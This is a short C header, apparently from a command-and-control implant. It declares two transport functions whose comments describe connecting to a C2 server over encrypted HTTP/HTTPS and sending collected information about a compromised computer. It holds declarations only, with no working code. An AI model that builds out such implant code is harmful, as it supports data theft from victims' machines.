#ifndef REVNT_TRANSPORT_H
#define REVNT_TRANSPORT_H

#include <Package.h>

/*!
 * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption
 * and send the collected user/computer info about the compromised Computer
 * @return Return if functions ran successful
 */
BOOL TransportInit( );

/*!
 * Send our specified data + encrypt it with random key
 * @param Data Data we want to send
 * @param Size Size of Data we want to send
 * @return Return if functions ran successful
 */
BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );

#endif
